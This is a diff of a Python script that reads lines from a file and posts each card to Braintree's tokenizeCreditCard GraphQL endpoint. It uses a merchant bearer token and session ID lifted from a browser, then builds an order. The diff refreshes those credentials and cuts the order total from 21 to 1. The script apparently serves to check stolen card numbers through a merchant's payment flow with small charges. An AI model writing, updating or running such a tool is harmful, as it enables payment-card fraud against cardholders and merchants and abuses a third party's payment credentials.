@@ -134,27 +134,29 @@ for P in file.readlines():
     
     
     headers = {
-        'authority': 'payments.braintree-api.com',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ4NjM4MjQsImp0aSI6Ijc3OTQ2MDcyLWQ3YjktNDhkMi1hNDZkLTdhYzNmNDhiNTlkMCIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.9UQTCgbpZjwIMxCnXDxjmDSZWkluDPr8Zjo0r7WA6-ykndLeNh9jENkB2qdV6UWDOMbOrTf29QFSzAPzTv9qAw',
-        'braintree-version': '2018-05-10',
-        'content-type': 'application/json',
-        'origin': 'https://assets.braintreegateway.com',
-        'referer': 'https://assets.braintreegateway.com/',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    }
+    headers = {
+            'authority': 'payments.braintree-api.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
+            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzUwODQ5OTQsImp0aSI6IjNlODdhZGRjLWQ2MDItNDg1NS04NmM2LWYwOWVmZDE4NzFiOSIsInN1YiI6InBiZ2dxNTZyNzR5NjVmZ3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBiZ2dxNTZyNzR5NjVmZ3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.XhEVFnDJtVjmKFnfElPE5BnzRvcfVzu3yIioSlw1m7aEEPfElGi6mgEUYwMj9v1uBBuA-0-XiRro3EYQJLvI7Q',
+            'braintree-version': '2018-05-10',
+            'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
+            'referer': 'https://assets.braintreegateway.com/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'cross-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        }
+    
     json_data = {
         'clientSdkMetadata': {
             'source': 'client',
             'integration': 'custom',
-            'sessionId': '89c55b0a-13a4-4734-a209-30fdca9eb130',
+            'sessionId': '307fefce-6b42-460d-b645-a19da55f02c4',
         },
         'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
         'variables': {
@@ -174,7 +176,6 @@ for P in file.readlines():
     }
     
     response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-    
     
 
     try:
@@ -232,7 +233,7 @@ for P in file.readlines():
                     'ProductId': '1',
                     'Name': '',
                     'ProductPrice': '0',
-                    'TotalPrice': '21',
+                    'TotalPrice': '1',
                     'DiscountPrice': '0',
                     'Order': 0,
                     'Description': '',
